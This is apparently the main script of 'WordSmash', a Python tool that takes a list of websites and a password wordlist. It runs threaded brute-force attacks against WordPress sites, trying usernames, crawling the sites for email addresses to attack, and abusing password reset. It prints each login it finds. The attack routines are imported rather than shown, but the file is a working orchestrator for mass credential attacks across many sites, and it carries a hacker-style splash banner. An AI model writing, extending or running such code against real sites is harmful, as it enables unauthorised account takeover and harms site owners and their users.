from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlparse

from argparse import ArgumentParser

from wordsmash.crawler import Crawler
from wordsmash.attacks import (
    username_and_wordlist_attack,
    email_and_wordlist_attack,
    password_reset_attack,
)


def thread_manager(args) -> None:
    print(splash())
    sites = [site.strip() for site in open(args.site_list).readlines()]
    executor = ThreadPoolExecutor(max_workers=args.threads)

    for url in sites:
        executor.submit(
            attack_thread,
            url,
            args.wordlist,
            args.dynamic_wordlist,
            args.persist,
        )


def attack_thread(
    url: str,
    wordlist_file: str,
    dynamic_wordlist: bool = False,
    persist: bool = False,
) -> None:
    results = attack_site(url, wordlist_file, dynamic_wordlist, persist)
    for result in results:
        if len(result) == 3:
            print(
                f"[+] Found email login! {urlparse(url).netloc}:{result[1]}:{result[2]}"
            )
        else:
            print(
                f"[+] Found wordpress login! {urlparse(url).netloc}:{result[0]}:{result[1]}"
            )


def attack_site(
    url: str,
    wordlist_file: str,
    dynamic_wordlist: bool = False,
    persist: bool = False,
) -> None:
    results = []

    result = username_and_wordlist_attack(url, wordlist_file, dynamic_wordlist)
    if result:
        results.append(result)
        if not persist:
            return results

    emails = Crawler(root_url=url).run()

    result = email_and_wordlist_attack(
        emails, url, wordlist_file, dynamic_wordlist
    )
    if result:
        results.append(result)
        if not persist:
            return results

    result = password_reset_attack(emails, url, wordlist_file, dynamic_wordlist)
    if result:
        results.append(result)
        if not persist:
            return results

    return results


def splash():
    return '''
                                        ,   ,
                                        $,  $,     ,
                                        "ss.$ss. .s'
                                ,     .ss$$$$$$$$$$s,
                                $. s$$$$$$$$$$$$$$`$$Ss
                                "$$$$$$$$$$$$$$$$$$o$$$       ,
                               s$$$$$$$$$$$$$$$$$$$$$$$$s,  ,s
                              s$$$$$$$$$"$$$$$$""""$$$$$$"$$$$$,
                              s$$$$$$$$$$s""$$$$ssssss"$$$$$$$$"
                             s$$$$$$$$$$'         `"""ss"$"$s""
                             s$$$$$$$$$$,              `"""""$  .s$$s
                             s$$$$$$$$$$$$s,...               `s$$'  `
                         `ssss$$$$$$$$$$$$$$$$$$$$####s.     .$$"$.   , s-
                           `""""$$$$$$$$$$$$$$$$$$$$#####$$$$$$"     $.$'
                                 "$$$$$$$$$$$$$$$$$$$$$####s""     .$$$|
                                   "$$$$$$$$$$$$$$$$$$$$$$$$##s    .$$" $
                                   $$""$$$$$$$$$$$$$$$$$$$$$$$$$$$$$"   `
                                  $$"  "$"$$$$$$$$$$$$$$$$$$$$S""""'
                             ,   ,"     '  $$$$$$$$$$$$$$$$####s
                             $.          .s$$$$$$$$$$$$$$$$$####"
                 ,           "$s.   ..ssS$$$$$$$$$$$$$$$$$$$####"
                 $           .$$$S$$$$$$$$$$$$$$$$$$$$$$$$#####"
                 Ss     ..sS$$$$$$$$$$$$$$$$$$$$$$$$$$$######""
                  "$$sS$$$$$$$$$$$$$$$$$$$$$$$$$$$########"
           ,      s$$$$$$$$$$$$$$$$$$$$$$$$#########""'
           $    s$$$$$$$$$$$$$$$$$$$$$#######""'      s'         ,
           $$..$$$$$$$$$$$$$$$$$$######"'       ....,$$....    ,$
            "$$$$$$$$$$$$$$$######"' ,     .sS$$$$$$$$$$$$$$$$s$$
              $$$$$$$$$$$$#####"     $, .s$$$$$$$$$$$$$$$$$$$$$$$$s.
   )          $$$$$$$$$$$#####'      `$$$$$$$$$###########$$$$$$$$$$$.
  ((          $$$$$$$$$$$#####       $$$$$$$$###"       "####$$$$$$$$$$
  ) \         $$$$$$$$$$$$####.     $$$$$$###"             "###$$$$$$$$$   s'
 (   )        $$$$$$$$$$$$$####.   $$$$$###"                ####$$$$$$$$s$$'
 )  ( (       $$"$$$$$$$$$$$#####.$$$$$###'                .###$$$$$$$$$$"
 (  )  )   _,$"   $$$$$$$$$$$$######.$$##'                .###$$$$$$$$$$
 ) (  ( \.         "$$$$$$$$$$$$$#######,,,.          ..####$$$$$$$$$$$"
(   )$ )  )        ,$$$$$$$$$$$$$$$$$$####################$$$$$$$$$$$"
(   ($$  ( \     _sS"  `"$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$S$$,
 )  )$$$s ) )  .      .   `$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$"'  `$$
  (   $$$Ss/  .$,    .$,,s$$$$$$##S$$$$$$$$$$$$$$$$$$$$$$$$S""        '
    \)_$$$$$$$$$$$$$$$$$$$$$$$##"  $$        `$$.        `$$.
        `"S$$$$$$$$$$$$$$$$$#"      $          `$          `$
            `"""""""""""""'         '           '           '
          _       __               _______                      __  
         | |     / /___  _________/ / ___/____ ___  ____ ______/ /_ 
         | | /| / / __ \/ ___/ __  /\__ \/ __ `__ \/ __ `/ ___/ __ \\
         | |/ |/ / /_/ / /  / /_/ /___/ / / / / / / /_/ (__  ) / / /
         |__/|__/\____/_/   \__,_//____/_/ /_/ /_/\__,_/____/_/ /_/ 

                                                 - TheArchivist01 -
                          Clavis est ad universum in corde machinae
'''


def main():
    parser = ArgumentParser(
        prog="WordSmash", description="Your WordPress site's best friend"
    )
    parser.add_argument(
        "--wordlist",
        "-w",
        type=str,
        help="List of password to attempt to login with",
    )
    parser.add_argument(
        "--site-list", "-s", type=str, help="List of sites to attempt accessing"
    )
    parser.add_argument(
        "--dynamic-wordlist",
        "-dw",
        action="store_true",
        default=False,
        help="Use dynamic placeholder values in wordlist",
    )
    parser.add_argument(
        "--persist",
        "-p",
        action="store_true",
        default=False,
        help="Continue trying to find additional logins for a site after login success",
    )
    parser.add_argument(
        "--threads",
        "-t",
        type=int,
        help="Maximum number of sites to check in parallel",
    )
    parser.set_defaults(func=thread_manager)
    args = parser.parse_args()
    args.func(args)


if __name__ == "__main__":
    main()
